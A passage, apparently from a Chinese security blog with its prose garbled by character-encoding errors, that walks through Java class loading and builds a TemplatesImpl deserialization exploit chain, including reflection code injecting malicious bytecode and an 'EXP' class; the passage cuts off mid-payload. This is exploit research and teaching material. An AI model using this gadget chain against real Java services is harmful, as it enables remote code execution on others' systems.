è½½æ˜¯æŒ‡å°†ç±»çš„å­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶è½¬æ¢æˆ JVM ä¸­çš„<strong>Class</strong>å¯¹è±¡çš„è¿‡ç¨‹ã€‚</p><p>åŠ è½½ç±»çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç»å†ä¸‹åˆ—ä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨ï¼š</p><p>(<code>ClassLoader</code> æ˜¯Javaä¸­çš„ç±»åŠ è½½å™¨)</p><p><img src="/img/cc301.png" alt="cc301"></p><ul><li><code>loadClass</code> çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ <code>findClass</code></li><li><code>findClass</code> çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ <code>defineClass</code></li><li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</li></ul><p>ä¸¾ä¸ªåˆ©ç”¨<code>defineClass</code>æ‰§è¡Œä»£ç çš„ä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method; <span class="hljs-comment">// å¯¼å…¥java.lang.reflectåŒ…ä¸­çš„Methodç±»</span><br><span class="hljs-keyword">import</span> java.util.Base64; <span class="hljs-comment">// å¯¼å…¥java.utilåŒ…ä¸­çš„Base64ç±»</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸ºHelloDefineClassçš„å…¬å…±ç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸ºmainçš„å…¬å…±é™æ€æ–¹æ³•ï¼ŒæŠ›å‡ºExceptionå¼‚å¸¸</span><br>        <span class="hljs-comment">// è·å–ClassLoaderç±»çš„defineClassæ–¹æ³•ï¼Œå¹¶è®¾ç½®ä¸ºå¯è®¿é—®</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// ä½¿ç”¨Base64ç±»è§£ç ç»è¿‡Base64ç¼–ç çš„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br><br>        <span class="hljs-comment">// è°ƒç”¨ClassLoaderç±»çš„defineClassæ–¹æ³•ï¼ŒåŠ¨æ€å®šä¹‰ä¸€ä¸ªç±»ï¼Œå¹¶å°†ç»“æœè½¬æ¢ä¸ºClasså¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ–å®šä¹‰çš„ç±»ï¼Œä¸å®ä¾‹åŒ–æ²¡æ³•è°ƒç”¨ä»£ç </span><br>        <span class="hljs-comment">//è¿™é‡Œç›´æ¥ç”¨çš„defineClassæ–¹æ³•ï¼Œå› ä¸ºå·²ç»çŸ¥é“è¦åŠ è½½çš„ç±»ã€å­—èŠ‚ç æ˜¯ä»€ä¹ˆäº†</span><br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œåœ¨ <code>defineClass()</code> è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨ <code>defineClass()</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚<strong>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ <code>defineClass()</code> åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•° <code>newInstance()</code>ã€‚</strong></p><p>å¯ä»¥å†çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-comment">// å­˜æ”¾ä»£ç å—</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> staticVar;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> instanceVar;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ„é€ ä»£ç å—&quot;</span>);<br>    &#125;<br><br>    Person()&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ å™¨&quot;</span>);<br>    &#125;<br>    Person(<span class="hljs-type">int</span> instanceVar)&#123;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ å™¨&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticAction</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/cc302.png" alt="cc302"></p><p>è¿™é‡Œå¦‚æœæŠŠ<code>newclass.newInstance()</code>æ³¨é‡Šæ‰(å³åªåŠ è½½ä¸è¿›è¡Œå®ä¾‹åŒ–)ä¼šå‘ç°æ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚</p><p>ä¸‹é¢å°±æ˜¯æ–‡ç« ä¸­çš„åˆ©ç”¨ç±»ï¼š</p><p>é¦–å…ˆï¼Œ<code>TemplatesImpl.java</code>ä¸‹å­˜åœ¨<code>defineClass</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä½†æ³¨æ„è¿™æ˜¯è¢«<code>default</code>ä¿®é¥°çš„ï¼Œç»§ç»­æ‰¾æœ‰æ²¡æœ‰åœ°æ–¹è°ƒç”¨äº†ä»–ï¼š</p><p><img src="/img/cc303.png" alt="cc303"></p><p>åŒä¸€ä¸ªç±»ä¸‹çš„ <code>getTransletInstance()</code> æ–¹æ³•è°ƒç”¨äº† <code>defineTransletClasses()</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæœ‰ä¸€ä¸ª <code>newInstance()</code> å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼Œå¦‚æœèƒ½èµ°å®Œè¿™ä¸ªå‡½æ•°é‚£ä¹ˆå°±èƒ½åŠ¨æ€æ‰§è¡Œä»£ç :</p><p><img src="/img/cc304.png" alt="cc304"></p><p>è¿™é‡Œå¯èƒ½ä¼šæƒ³ï¼š</p><p>è¿™ä¸æ˜¯å¯¹<code>_class[_transletIndex].newInstance();</code>è°ƒç”¨<code>newInstance()</code>å—ï¼Ÿ</p><p>å¯ä»¥çœ‹çœ‹è¿™ä¸ªä¸œè¥¿æ˜¯ä¸ªå•¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>           _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure><p>ç„¶åå­˜åœ¨ä¸€ä¸ª<code>public</code>ä¿®é¥°çš„æ–¹æ³•ï¼š<code>newTransformer</code></p><p><img src="/img/cc305.png" alt="cc305"></p><h4 id="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h4><p>æ ¹æ®ä¸Šé¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“ï¼šæœ€ç»ˆç›®æ ‡å°±æ˜¯è°ƒç”¨<code>templates.java</code>ä¸‹çš„<code>newTransformer()</code>æ–¹æ³•</p><p>å¤§è‡´è°ƒç”¨é¡ºåºï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;  <br>newTransformer -&gt; getTransletInstance<br>    -&gt; define<span class="hljs-constructor">TransletClasses()</span> <span class="hljs-comment">//å¹¶ä¸”å­˜åœ¨å®ä¾‹åŒ–:</span><br>    -&gt; AbstractTranslet translet = (AbstractTranslet) _class<span class="hljs-literal">[<span class="hljs-identifier">_transletIndex</span>]</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>    æ³¨æ„ï¼š<br>    define<span class="hljs-constructor">TransletClasses()</span> -&gt;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = loader.define<span class="hljs-constructor">Class(<span class="hljs-params">_bytecodes</span>[<span class="hljs-params">i</span>])</span>;<br>                <span class="hljs-comment">//defineclassåªæ˜¯åŠ è½½ç±»æ²¡æœ‰æ‰§è¡Œï¼ŒåŠ è½½å®Œäº†æ‰§è¡Œæ‰èƒ½è§¦å‘ç±»çš„åŠ¨æ€åŠ è½½ï¼šæ¶æ„ä»£ç </span><br></code></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹è°ƒç”¨<code>getTransletInstance</code>ä¸‹çš„<code>defineTransletClasses()</code>å¾—æ»¡è¶³å•¥æ¡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure><ul><li><code>_name</code>ä¸º<code>null</code>ï¼Œåˆ™ç›´æ¥<code>return null</code></li><li><code>_classs</code> ä¸º<code>null</code>ï¼Œè°ƒç”¨ <code>newInstance()</code></li></ul><p>å…ˆçœ‹ä¸€çœ¼æ— å‚æ„é€ å‡½æ•°å§ï¼Œéƒ½æ€ä¹ˆèµ‹å€¼çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">()</span> &#123; &#125; <span class="hljs-comment">//ç©ºçš„</span><br></code></pre></td></tr></table></figure><p>ç„¶åå†çœ‹çœ‹<code>defineTransletClasses()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125; <span class="hljs-comment">//æ‰€ä»¥è¿™é‡Œ_bytecodeså¾—æ˜¯ç©ºçš„</span><br>    <br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<span class="hljs-comment">//æ³¨æ„è¿™ä¸ª_tfactoryï¼Œä»–ä¸èƒ½ä¸ºç©º</span><br></code></pre></td></tr></table></figure><p>çœ‹å›¾çš„è¯æ–¹ä¾¿ç‚¹ï¼š(DBå¸ˆå‚…çš„å›¾)</p><p><img src="/img/cc306.png" alt="cc306"></p><p>æ¥ä¸‹æ¥çœ‹çœ‹<code>defineTransletClasses</code>å¦‚ä½•åˆ©ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹è¿™ä¸ª<code>_bytecodes</code>è¯¥å¦‚ä½•å®šä¹‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[][] _bytecodes = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>è¿™æ²Ÿæ§½çš„æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodefield</span> <span class="hljs-operator">=</span> temp1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br><br>classfield.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">byte</span> [] byte1 =  Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));<br><br><span class="hljs-type">byte</span> [] [] evil = &#123;byte1&#125;;<br><br>bytecodefield.set(temp1,evil);<br></code></pre></td></tr></table></figure><p><code>defineTransletclasses</code>ä¸‹å­˜åœ¨å¦‚ä¸‹é™åˆ¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>........<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>                &#125;<br>            &#125;);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>_tfactory</code>ç»ä¸èƒ½ä¸ºç©ºã€‚<code>_tfactory</code> çš„å€¼åœ¨ <code>TemplatesImpl</code> è¿™ä¸€ç±»ä¸­è¢«å®šä¹‰å¦‚ä¸‹ï¼Œå…³é”®å­—æ˜¯ <code>transient</code>ï¼Œè¿™é‡Œè¿›è¡Œäº†å­—æ®µåˆå§‹åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure><p>ä»–ä¸å…‰ä¸º<code>null</code>ï¼Œè€Œä¸”è¢«<code>transient</code>ä¿®é¥°ã€‚è¿™ä¸œè¥¿åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½ä¸ä¼šè¢«ä¼ è¿›å»ã€‚ä¸è¿‡åœ¨<code>readObject</code>æ–¹æ³•ä¸­å·²ç»ç»™ä»–ä»˜äº†ä¸€ä¸ªå€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream is)</span><br>      <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br><span class="hljs-comment">//çœç•¥</span><br>        _tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œä¸ç®¡ä»–å°±è¡Œï¼Œåæ­£åˆ°æ—¶å€™ååºåˆ—åŒ–ä¼šè‡ªåŠ¨ç»™ä¸ªå€¼ã€‚</p><p>å…ˆä¸ç€æ€¥åºåˆ—åŒ–ååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>newTransformer</code>æ–¹æ³•çœ‹çœ‹èƒ½ä¸èƒ½æ‰“é€šã€‚æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨åå°„å¾—ç»™ä»–èµ‹æˆreadObjectæ—¶çš„å€¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>æˆªæ­¢åˆ°ç›®å‰çš„EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªæ—¶å€™ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™ï¼Œè§£å†³åŠæ³•(å‚è€ƒDBå¸ˆå‚…çš„å›¾)ï¼š</p><p><img src="/img/Debug.png" alt="Debug"></p><ul><li>418 è¡Œï¼Œåˆ¤æ–­åœ¨ <code>defineClass()</code> æ–¹æ³•ä¸­ä¼ è¿›å»çš„å‚æ•° b æ•°ç»„çš„å­—èŠ‚ç æ˜¯å¦ç»§æ‰¿äº† <code>ABSTRACT_TRANSLET</code> è¿™ä¸ªçˆ¶ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»æ¶æ„ç±»ä¸­ç»§æ‰¿ <code>ABSTRACT_TRANSLET</code> è¿™ä¸ªçˆ¶ç±»ã€‚</li></ul><p>æ³¨æ„è¿™æ˜¯ä¸ªæŠ½è±¡ç±»ï¼Œé‡Œé¢çš„æŠ½è±¡æ–¹æ³•éƒ½å¾—å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span 